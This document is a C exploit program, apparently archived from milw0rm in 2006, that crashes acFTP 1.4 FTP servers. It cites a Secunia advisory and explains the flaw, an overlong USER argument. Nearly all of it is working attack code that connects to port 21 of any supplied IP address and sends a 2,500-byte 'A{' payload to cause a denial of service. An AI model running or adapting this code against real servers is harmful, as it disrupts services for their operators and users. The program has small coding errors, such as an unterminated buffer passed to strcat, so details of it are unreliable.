/**
Exploit for : acFTP 1.4 DoS Exploit
Advisory : http://secunia.com/advisories/19978/
Coder : Omnipresent
Email : omnipresent@email.it
Description : Preddy has discovered a vulnerability in acFTP, which can be exploited by malicious people to cause a DoS (Denial of Service).
The vulnerability is caused due to an error within the handling of the argument passed to the 
"USER" command. This can be exploited to crash the FTP server via an overly long argument that 
contains certain character sequences.

The vulnerability has been confirmed in version 1.4. Other versions may also be affected.

Date: 05/06/2006 - M/D/Y
**/

#ifdef _WIN32
#include <winsock2.h>

SOCKET sock;
WSADATA wsaData;
WORD wVersionRequested;

#else
#include <sys/socket.h>
#include <netinet/in.h>
#define INVALID_SOCKET -1
#define SOCKET_ERROR -1

int sock;
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv)
{
char buf[2505];
struct sockaddr_in saddr;
unsigned long ip;
int i;

if (argc != 2)
{
printf("acFTP 1.4 USER Command - DoS Exploit!\r\n");
printf("Coded by OmniPresent - omnipresent@email.it\r\n");
printf("acFTP 1.4 - DoS Exploit!rn");
printf("Advisory: http://secunia.com/advisories/19978/");
printf("%s <IP_Address>\r\n", argv[0]);

exit(1);
}

ip = inet_addr(argv[1]);

#ifdef _WIN32
wVersionRequested = MAKEWORD(2, 2);
if (WSAStartup(wVersionRequested, &wsaData) < 0)
{
printf("Unable to initialise Winsockr\n");
exit(1);
}
#endif


if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
{
printf("Socket Error \n");
exit(1);
}


memset(&saddr,'0', sizeof(saddr));
saddr.sin_port = htons(21); //21 is the default port of acFTP service (change it if necessary)
saddr.sin_family = AF_INET;
memcpy(&saddr.sin_addr, (unsigned long *)&ip, sizeof((unsigned long *)&ip));

if (connect(sock, (struct sockaddr *)&saddr, sizeof(saddr)) == SOCKET_ERROR)
{
printf("Connect Error \n");
exit(1);
}

sleep(2); 
    
    buf[0]='U';
    buf[1]='S';
    buf[2]='E';
    buf[3]='R';
    buf[4]=' ';
    i = 5;
while (i < 2500) {

buf[i] = 'A';
i++;
buf[i] = '{';
i++;
}
strcat(buf, "\r\n");

printf("%s\n",buf);


send(sock, buf, sizeof(buf), 0);

#ifdef _WIN32
closesocket(sock);
#else
close(sock);
#endif
printf("DoS Attack Done!\n");
}

// milw0rm.com [2006-05-06]
